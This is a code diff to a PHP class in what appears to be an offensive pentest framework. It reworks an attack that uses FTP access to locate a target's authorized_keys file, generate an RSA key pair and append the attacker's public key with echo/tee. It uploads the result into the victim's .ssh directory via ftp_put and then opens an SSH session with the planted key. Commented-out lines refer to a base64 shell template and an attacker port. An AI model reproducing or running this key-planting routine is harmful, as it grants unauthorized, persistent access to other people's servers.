@@ -116,7 +116,7 @@ class check4linux8protocol extends AUTH{
                         $info['day'] = $vinfo[6];
                         $info['time'] = $vinfo[7];
                         $info['name'] = $vinfo[8];
-                        $info['path'] = "$base$dirname/".$vinfo[8];
+                        $info['path'] = "$base$dirname".$vinfo[8];
                         $rawlist[$info['name']] = $info;
                     }
                 }
@@ -152,20 +152,30 @@ class check4linux8protocol extends AUTH{
                 $str_files = $this->tab($tab_files);
                 
                 $this->pause();
-                $remote_authorized_keys_filepath = $this->ftp2search4path($tab_files, "authorized_keys");
+                foreach ($tab_files as $file_check ){
+                    $file_check = trim($file_check);
+                    if (strstr($file_check, "authorized_keys")!==FALSE) $remote_authorized_keys_filepath = $file_check;
+                }
+                
                 $this->article("PATH authorized_keys", $remote_authorized_keys_filepath);
                 $this->pause();
                 
                 $racine_ftp = ftp_pwd($ftp_stream);
                 
+                $type_crypt = "rsa";
+                $private_keys_str = $this->key2gen4priv2str("",$type_crypt);
+                $public_authorized_keys_str2use = $this->key2gen4public2str("",$private_keys_str,$type_crypt);
+                
+                /*
                 $private_key_ssh_rsa_file = "$this->dir_tmp/$this->ip.$remote_username_ftp.rsa.priv";
-                $obj_file = new FILE($this->stream,$private_key_ssh_rsa_file);
+                $obj_file = new FILE("",$private_key_ssh_rsa_file);
                 $public_key_ssh_rsa_file = "$obj_file->file_dir/$obj_file->file_name.pub";
                 $private_key_passwd = '';
                 $private_keys_str = $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file);
                 $public_authorized_keys_str2use = $this->key2gen4public("",10, $private_key_ssh_rsa_file, $public_key_ssh_rsa_file, $private_key_passwd);
                 
                 $this->pause();
+                */
                 
                 if (empty($remote_authorized_keys_filepath)){
                     
@@ -177,7 +187,7 @@ class check4linux8protocol extends AUTH{
                     $tmp = ftp_rawlist($ftp_stream, "$racine_ftp",TRUE);
                     if (!$tmp) echo $tmp ;
                     
-                    $query = "cat $public_key_ssh_rsa_file > /tmp/authorized_keys";
+                    $query = "echo '$public_authorized_keys_str2use' >> /tmp/authorized_keys";
                     $this->requette($query);
                     ftp_put($ftp_stream, "$racine_ftp.ssh/authorized_keys", "/tmp/authorized_keys", FTP_ASCII);
                     
@@ -214,15 +224,19 @@ class check4linux8protocol extends AUTH{
                     else {
                         $chaine = "Public key added\n";
                         $this->note($chaine);
-                        $query = " echo '$public_keys_found' | tee -a /tmp/authorized_keys_get";
+                        $query = " echo '$public_authorized_keys_str2use' | tee -a /tmp/authorized_keys_get";
                         $this->req_ret_str($query);
+                        ftp_put($ftp_stream,$remote_authorized_keys_filepath, "/tmp/authorized_keys_get", FTP_ASCII);
+                        
                         
                     }
                     $this->pause();
                     
                     // ftp_site($conn, 'CHMOD 0600 /home/user/privatefile')
                     
+                    $this->key2pentest8attacker("",$remote_username_ftp,$private_keys_str,$ssh_open,$type_crypt);
                     
+                    /*
                     $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $remote_username_ftp, $private_key_ssh_rsa_file,$private_key_passwd);
                     if(is_resource($stream)){
                         $info = "SSH Private Key:$private_key_ssh_rsa_file";
@@ -239,7 +253,7 @@ class check4linux8protocol extends AUTH{
                         $type = "server";
                         $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
                     }
-                    
+                    */
                     
                     
                 }
@@ -279,7 +293,7 @@ class check4linux8protocol extends AUTH{
                 $info['day'] = $vinfo[6];
                 $info['time'] = $vinfo[7];
                 $info['name'] = $vinfo[8];
-                $info['path'] = "$base/".$vinfo[8];
+                $info['path'] = "$base".$vinfo[8];
                 $rawlist[$info['name']] = $info;
             }
         }
@@ -312,7 +326,7 @@ class check4linux8protocol extends AUTH{
                         $info['day'] = $vinfo[6];
                         $info['time'] = $vinfo[7];
                         $info['name'] = $vinfo[8];
-                        $info['path'] = "$base/$dirname/".$vinfo[8];
+                        $info['path'] = "$base$dirname/".$vinfo[8];
                         $rawlist[$info['name']] = $info;
                     }
                 }
